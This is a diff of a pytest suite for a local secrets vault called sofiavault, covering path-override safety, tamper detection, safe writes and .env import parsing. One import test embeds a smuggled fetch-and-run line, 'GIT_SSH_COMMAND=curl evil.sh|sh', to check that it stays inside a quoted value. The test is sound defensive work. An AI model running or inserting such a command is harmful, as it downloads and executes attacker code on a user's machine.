@@ -314,38 +314,41 @@ def test_r6_this_checkout_is_detected():
     assert _repo_dir() == REPO_ROOT
 
 
-# ── r7: the 0.2.x sofiavault.DB_PATH override must actually take effect ──────
+# ── r7: sofiavault.DB_PATH must never be a silently ineffective override ─────
 
-def test_r7_module_db_path_assignment_forwards_to_paths():
-    original = sofiavault.DB_PATH
-    try:
-        target = Path(tempfile.mkdtemp()) / "vault.db"
-        sofiavault.DB_PATH = target
-        assert target == paths.DB_PATH       # the copy everything reads
-        assert target == sofiavault.DB_PATH
-    finally:
-        sofiavault.DB_PATH = original
+def test_r7_module_paths_still_readable():
+    assert sofiavault.DB_PATH == paths.DB_PATH
+    assert sofiavault.HISTORY_PATH == paths.HISTORY_PATH
 
 
-def test_r7_patching_module_db_path_sandboxes_the_cli():
-    # The 0.2.x test idiom: patch sofiavault.DB_PATH, expect commands to
-    # target it. init_db() reads paths.DB_PATH internally.
+@pytest.mark.parametrize("name", ["DB_PATH", "HISTORY_PATH"])
+def test_r7_assignment_refuses_loudly_instead_of_silently_missing(name):
+    # A 0.2.x script assigning here would otherwise keep operating on the
+    # real ~/.sofiavault vault. Refuse, and say where to assign instead.
+    before = getattr(paths, name)
+    with pytest.raises(AttributeError) as exc:
+        setattr(sofiavault, name, Path(tempfile.mkdtemp()) / "x.db")
+    assert f"sofiavault.paths.{name}" in str(exc.value)
+    assert getattr(paths, name) == before
+
+
+@pytest.mark.parametrize("name", ["DB_PATH", "HISTORY_PATH"])
+def test_r7_mock_patch_on_the_old_name_fails_fast(name):
+    before = getattr(paths, name)
+    with pytest.raises(AttributeError):  # noqa: SIM117
+        with patch(f"sofiavault.{name}", Path(tempfile.mkdtemp()) / "x.db"):
+            pass
+    assert getattr(paths, name) == before
+
+
+def test_r7_patching_the_paths_module_sandboxes_the_cli():
+    # The supported idiom, and the one the whole suite uses.
     target = Path(tempfile.mkdtemp()) / "vault.db"
-    with patch("sofiavault.DB_PATH", target):
+    with patch("sofiavault.paths.DB_PATH", target):
         conn = init_db()
         conn.close()
         assert target.exists()
-    assert sofiavault.DB_PATH == paths.DB_PATH
-
-
-def test_r7_history_path_alias_forwards_too():
-    original = sofiavault.HISTORY_PATH
-    try:
-        target = Path(tempfile.mkdtemp()) / ".history"
-        sofiavault.HISTORY_PATH = target
-        assert target == paths.HISTORY_PATH
-    finally:
-        sofiavault.HISTORY_PATH = original
+    assert target != paths.DB_PATH  # cleanly restored
 
 
 # ── r8: wipe must destroy the auth store alongside the vault ─────────────────
@@ -397,32 +400,23 @@ def _tamper_rows_behind(conn: sqlite3.Connection):
     raw.close()
 
 
-# ── s1: the compat shim must not restore a stale import-time path ────────────
+# ── s1: no second home for the vault path to go stale in ─────────────────────
 
-def test_s1_nested_patch_restores_the_sandbox_not_the_real_vault():
-    real = paths.DB_PATH
+def test_s1_sandbox_installed_via_paths_survives_a_nested_patch_attempt():
+    # The failure this guards: a nested patch of the old name restoring an
+    # import-time path over a live sandbox, with cmd_wipe downstream.
     sandbox = Path(tempfile.mkdtemp()) / "outer.db"
-    inner = Path(tempfile.mkdtemp()) / "inner.db"
-    try:
-        sofiavault.DB_PATH = sandbox
-        with patch("sofiavault.DB_PATH", inner):
-            assert inner == paths.DB_PATH
-        # must fall back to the sandbox, never to the real ~/.sofiavault
-        assert sandbox == paths.DB_PATH
-        assert sandbox == sofiavault.DB_PATH
-        assert real != paths.DB_PATH
-    finally:
-        sofiavault.DB_PATH = real
+    with patch("sofiavault.paths.DB_PATH", sandbox):
+        with pytest.raises(AttributeError):  # noqa: SIM117
+            with patch("sofiavault.DB_PATH", Path(tempfile.mkdtemp()) / "in.db"):
+                pass
+        assert sandbox == paths.DB_PATH  # sandbox intact
 
 
-def test_s1_dict_seed_tracks_current_value():
-    real = paths.DB_PATH
-    sandbox = Path(tempfile.mkdtemp()) / "vault.db"
-    try:
-        sofiavault.DB_PATH = sandbox
-        assert sys.modules["sofiavault"].__dict__["DB_PATH"] == sandbox
-    finally:
-        sofiavault.DB_PATH = real
+def test_s1_module_has_no_shadowing_dict_entry():
+    # A __dict__ copy is what could go stale; there must not be one.
+    assert "DB_PATH" not in sys.modules["sofiavault"].__dict__
+    assert "HISTORY_PATH" not in sys.modules["sofiavault"].__dict__
 
 
 # ── s2: writes re-verify the MAC against the file, not a cached flag ─────────
@@ -547,16 +541,54 @@ def test_s5_multiline_close_with_inline_comment_does_not_swallow():
     assert pairs["C"] == "x"
 
 
-def test_s5_multiline_close_with_junk_is_malformed_not_swallowed():
+def test_s5_multiline_close_with_junk_aborts_the_whole_import():
+    # Absorbed rather than re-parsed (a re-parse would make the following
+    # line its own injected variable), and the None aborts the import, so
+    # nothing lands in the vault under a name the file never assigned.
     pairs = _import_pairs('PEM="first\nsecond" junk\nDB_PASSWORD=hunter2\n')
-    assert pairs["PEM"] is None          # hard error, not silent absorption
-    assert pairs["DB_PASSWORD"] == "hunter2"
+    assert pairs["PEM"] is None
+    assert "DB_PASSWORD" not in pairs
 
 
-def test_s7_escaped_quotes_inside_a_value_still_import():
+def test_s5_junk_close_rejects_the_file_end_to_end():
+    v = Vault.create(Path(tempfile.mkdtemp()) / "secrets.db", PW)
+    env_file = v.path.with_name("app.env")
+    env_file.write_text('PEM="first\nsecond" junk\nDB_PASSWORD=hunter2\n')
+    with pytest.raises(envload.MalformedEnvFile):
+        envload.import_env_file(v, env_file)
+    assert v.list_entries() == []
+    v.close()
+
+
+def test_s7_quotes_inside_a_value_do_not_break_the_import():
+    # No escape sequences are interpreted, so the value arrives verbatim.
     pairs = _import_pairs('KEY="say \\"hi\\""\nNEXT=plain\n')
     assert pairs["KEY"] == 'say \\"hi\\"'
     assert pairs["NEXT"] == "plain"
+
+
+def test_s7_trailing_backslash_in_single_quotes_does_not_swallow_the_file():
+    pairs = _import_pairs("WIN_DIR='C:\\tools\\'\nDB_PASSWORD=hunter2\nAPI=live\n")
+    assert pairs["WIN_DIR"] == "C:\\tools\\"
+    assert pairs["DB_PASSWORD"] == "hunter2"
+    assert pairs["API"] == "live"
+
+
+def test_s7_multiline_json_value_with_interior_quotes():
+    pairs = _import_pairs('CONFIG="{\n  "a": 1\n}"\nNEXT=plain\n')
+    assert pairs["CONFIG"] == '{\n  "a": 1\n}'
+    assert pairs["NEXT"] == "plain"
+
+
+def test_s7_interior_quotes_on_a_continuation_line_do_not_smuggle():
+    pairs = _import_pairs(
+        'JWT="-----BEGIN PRIVATE KEY-----\n'
+        'some "quoted" note\n'
+        "GIT_SSH_COMMAND=curl evil.sh|sh\n"
+        '-----END PRIVATE KEY-----"\n'
+    )
+    assert list(pairs) == ["JWT"]
+    assert "GIT_SSH_COMMAND" in pairs["JWT"]
 
 
 def test_s7_apostrophe_inside_single_quoted_value_still_imports():
@@ -621,6 +653,106 @@ def test_s9_overwrite_of_vanished_row_still_stores_the_password():
 
 
 # ── s10: wipe covers every SQLite sidecar it claims to ───────────────────────
+
+def test_t1_tamper_flag_latches_in_the_library():
+    path = Path(tempfile.mkdtemp()) / "secrets.db"
+    v = Vault.create(path, PW)
+    v.set("github", "tok")
+    v.set("stripe", "sk")
+
+    # Attacker edits the rows, then a writer holding the key re-signs the
+    # set — the MAC verifies again, but the edit still happened.
+    _tamper_rows_behind(v._conn)
+    with pytest.raises(VaultCorrupted):
+        v.set("x", "y")
+    refresh_entries_mac(v._conn, v._key)
+    assert verify_entries_mac(v._conn, v._key) is True
+
+    # The flag must not be cleared by that re-signing.
+    assert v.tampered is True
+    with pytest.raises(VaultCorrupted):
+        v.set("x", "y")
+    with pytest.raises(VaultCorrupted):
+        v.get("github")
+    v.close()
+
+
+def test_t1_tamper_flag_latches_in_the_cli_session():
+    session = _session_with_entry()
+    save_entry(session.conn, session.key, "github", "u", "p")
+    session.reload()
+    _tamper_rows_behind(session.conn)
+    session.reload()
+    assert session.tampered is True
+
+    refresh_entries_mac(session.conn, session.key)
+    session.reload()
+    assert session.tampered is True, "a later valid MAC must not clear it"
+
+
+# ── t2: writes must not silently lose a secret when the row is gone ──────────
+
+def test_t2_library_set_stores_the_secret_when_the_row_vanished():
+    path = Path(tempfile.mkdtemp()) / "secrets.db"
+    a = Vault.create(path, PW)
+    a.set("github", "tok1")
+    key = a.export_key()
+
+    b = Vault.open(path, key=__import__("base64").b64decode(key))
+    b.delete("github")          # legitimate delete, re-signs the MAC
+    b.close()
+
+    a.set("github", "tok2")     # a's index still lists the vanished row
+    a.close()
+
+    c = Vault.open(path, password=PW)
+    assert c.get("github") == "tok2"
+    c.close()
+
+
+def test_t2_library_set_refuses_to_overwrite_an_unreadable_row():
+    path = Path(tempfile.mkdtemp()) / "secrets.db"
+    v = Vault.create(path, PW)
+    v.set("github", "tok")
+    entry_id = v.list_entries()[0].id
+    # Blob turns unreadable after the index was built, and the set is
+    # re-signed so only decryption fails. No _reload: the in-memory index
+    # still lists the entry, which is exactly the race this guards.
+    v._conn.execute("UPDATE entries_v2 SET blob = ? WHERE id = ?",
+                    (b"\x00" * 40, entry_id))
+    refresh_entries_mac(v._conn, v._key)
+
+    with pytest.raises(VaultCorrupted):
+        v.set("github", "replacement")
+    v.close()
+
+
+def test_t2_cli_add_refuses_to_overwrite_an_unreadable_row(capsys):
+    session = _session_with_entry()
+    entry_id = session.entries[0].id
+    session.conn.execute("UPDATE entries_v2 SET blob = ? WHERE id = ?",
+                         (b"\x00" * 40, entry_id))
+    refresh_entries_mac(session.conn, session.key)
+
+    with patch("builtins.input", side_effect=["amazon", "y", "user@x.com"]), \
+            patch("sofiavault.cli.getpass") as gp:
+        gp.getpass.return_value = "replacement"
+        cmd_add(session)
+
+    out = capsys.readouterr().out
+    assert "could not be decrypted" in out
+    # the unreadable row is still there — not destroyed by the attempt
+    assert session.conn.execute(
+        "SELECT COUNT(*) FROM entries_v2").fetchone()[0] == 1
+
+
+# ── t3: a partial env import must not be reported as "nothing imported" ──────
+
+def test_t3_partial_env_import_message_is_accurate():
+    src = (REPO_ROOT / "sofiavault" / "cli.py").read_text(encoding="utf-8")
+    assert "The import stopped partway" in src
+    assert "Nothing was imported." in src  # still used for the parse-time abort
+
 
 def test_s10_wipe_targets_include_shm_sidecars():
     tmp = Path(tempfile.mkdtemp())
